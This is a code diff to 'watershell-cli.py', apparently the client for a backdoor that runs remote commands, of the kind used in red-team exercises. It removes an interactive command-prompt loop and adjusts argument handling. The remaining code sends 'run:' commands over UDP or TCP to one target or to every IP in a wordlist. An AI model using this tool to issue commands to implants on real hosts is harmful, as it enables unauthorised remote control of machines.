@@ -52,7 +52,6 @@ def declare_args():
         '-t', '--target',
         dest='target',
         type=str,
-        required=True,
         help="Single IP target to send UDP/TCP message to (with -c option).")
     
     parser.add_argument(
@@ -102,25 +101,6 @@ def send_command_to_target(sock, target, command, tcp_bool):
         resp = recv_timeout(sock, 4)
         print(f"Response from {target}: {resp}")
 
-def execute_cmd_prompt(sock, target, tcp_bool):
-    """
-    Interactively prompt user for commands and execute them
-    """
-    if tcp_bool:
-        sock.connect(target)
-
-    while True:
-        cmd = input("¯\_(ツ)_/¯Cerberus¯\_(ツ)_/¯->-> ")
-        if cmd.lower() == 'exit':
-            break
-        if len(cmd) > 1:
-            if not tcp_bool:
-                sock.sendto(("run:" + cmd).encode(), target)
-                resp = recv_timeout(sock, 4)
-                print(resp)
-            else:
-                sock.send(("run:" + cmd).encode())
-
 def main():
     """
     Entry point to watershell-cli.py.
@@ -144,8 +124,8 @@ def main():
              (,-(,(,(,/      \,),),
         """)
 
-        target = (args.target, args.port)
         s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if args.tcp_bool else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        target = (args.target, args.port)
         s_socket.connect(target) if args.tcp_bool else s_socket.bind(("0.0.0.0", random.randint(40000, 65353)))
         
         while True:
@@ -156,14 +136,14 @@ def main():
         
         s_socket.close()
     
-    elif args.command:
+    elif args.target and args.command:
         target = (args.target, args.port)
         s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if args.tcp_bool else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s_socket.connect(target) if args.tcp_bool else s_socket.bind(("0.0.0.0", random.randint(40000, 65353)))
         send_command_to_target(s_socket, target, args.command, args.tcp_bool)
         s_socket.close()
 
-    elif args.wordlist:
+    elif args.wordlist and args.command:
         with open(args.wordlist, 'r') as f:
             for line in f:
                 ip = line.strip()
